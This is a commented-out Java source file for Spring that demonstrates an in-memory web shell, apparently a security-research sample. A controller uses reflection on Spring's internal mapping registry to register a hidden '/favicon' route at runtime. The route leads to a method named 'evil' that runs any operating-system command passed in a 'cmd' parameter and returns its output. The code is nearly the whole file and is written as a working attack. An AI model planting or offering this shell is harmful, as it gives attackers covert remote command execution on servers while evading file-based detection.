//package com;
//
//import org.springframework.stereotype.Controller;
//import org.springframework.web.bind.annotation.RequestMapping;
//import org.springframework.web.bind.annotation.ResponseBody;
//import org.springframework.web.context.WebApplicationContext;
//import org.springframework.web.context.request.RequestContextHolder;
//import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
//import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
//
//import javax.servlet.annotation.WebServlet;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.io.ByteArrayOutputStream;
//import java.io.InputStream;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//
///**
// * Created by dotast on 2022/11/25 16:37
// */
////@WebServlet("/injectController")
//@Controller
//public class InjectController extends HttpServlet {
//
//    @ResponseBody
//    @RequestMapping("/hello")
//    public String SayHello(HttpServletRequest req, HttpServletResponse resp){
//        String path = "/favicon";
//        try{
//            // 加载类
//            InjectController InjectController = new InjectController();
//            Method evilMethod = InjectController.class.getMethod("evil", HttpServletRequest.class, HttpServletResponse.class);
//            // 获取上下文环境
//            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
//            // 通过 context 获取 RequestMappingHandlerMapping 对象
//            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
//            // 获取父类的 MappingRegistry 属性
//            Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
//            f.setAccessible(true);
//            Object mappingRegistry = f.get(mappingHandlerMapping);
//            //路径映射绑定
//            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
//            configField.setAccessible(true);
//            // springboot 2.6.x之后的版本需要pathPatternsCondition
//            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
//            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).options(config).build();
//
//            // 反射调用 MappingRegistry 的 register 方法
//            Class c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
//            Method[] methods = c.getDeclaredMethods();
//            for (Method method:methods){
//                if("register".equals(method.getName())){
//                    // 反射调用 MappingRegistry 的 register 方法注册
//                    method.setAccessible(true);
//                    method.invoke(mappingRegistry,requestMappingInfo,InjectController,evilMethod);
//                }
//            }
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//
//        return "Hello!";
//    }
//
//    public void evil(HttpServletRequest request, HttpServletResponse response) throws Exception{
//        try{
//            String cmd = request.getParameter("cmd");
//            if(cmd != null){
//                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
//                ByteArrayOutputStream bao = new ByteArrayOutputStream();
//                byte[] bytes = new byte[1024];
//                int a = -1;
//                while((a = inputStream.read(bytes))!=-1){
//                    bao.write(bytes,0,a);
//                }
//                response.getWriter().write(new String(bao.toByteArray()));
//            }else {
//                response.sendError(404);
//            }
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//    }
//}